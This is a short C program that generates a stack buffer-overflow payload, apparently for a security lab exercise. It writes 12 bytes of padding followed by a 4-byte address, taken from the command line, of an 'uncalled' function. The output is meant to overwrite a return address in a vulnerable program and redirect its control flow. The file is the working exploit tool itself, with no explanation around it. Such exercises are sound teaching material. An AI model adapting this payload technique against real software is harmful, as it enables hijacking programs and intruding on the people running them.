#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

#define STDOUT_NO 1
#define FIRST 0x10000000
#define SECOND 0x01000000
#define THIRD 0x00100000
#define FOURTH 0x00010000
#define FIFTH 0x00001000
#define SIXTH 0x00000100
#define SEVENTH 0x00000010
#define EIGHTH 0x00000001

int convertHex (char c) {
	if ((c == 'A')||(c == 'a')) {
		return 10;
	}
	else if ((c == 'B') ||(c=='b')) {
		return 11;
	}
	else if ((c == 'C')||(c=='c')) {
		return 12;
	}
	else if ((c == 'D')||(c == 'd')) {
		return 13;
	}
	else if ((c == 'E')||(c == 'e')) {
		return 14;
	}
	else if ((c == 'F')||(c == 'f')) {
		return 15;
	}
	else return (c - 48);
}

int main(int argc, const char* argv[]) {
	int writeCount, uncalledAddress;


	char standard[12] = "abcdabcdabcd";
	uncalledAddress = FIRST * convertHex(argv[2][2]);
	uncalledAddress += SECOND * convertHex(argv[2][3]);
	uncalledAddress += THIRD * convertHex(argv[2][4]);
	uncalledAddress += FOURTH * convertHex(argv[2][5]);
	uncalledAddress += FIFTH * convertHex(argv[2][6]);
	uncalledAddress += SIXTH * convertHex(argv[2][7]);
	uncalledAddress += SEVENTH * convertHex(argv[2][8]);
	uncalledAddress += EIGHTH * convertHex(argv[2][9]);
	/*fprintf(stderr, "Address entered: %x\n", uncalledAddress);*/
	writeCount = write(STDOUT_NO, standard,12);
	if (writeCount != 12) {
		fprintf(stderr,"ERROR: Expected to prime buffer with 12 characters, wrote %d\n", writeCount);
	}
	if (writeCount == -1) {
		fprintf(stderr, "Error writing: %s\n", strerror(errno));
	}
	writeCount = write(STDOUT_NO, &uncalledAddress, 4);
	if (writeCount != 4) {
		fprintf(stderr, "ERROR: Expected to write address as 4 bytes, wrote %d\n", writeCount);
	}
	if (writeCount == -1) {
		fprintf(stderr, "Error writing: %s\n", strerror(errno));
	}
									
}
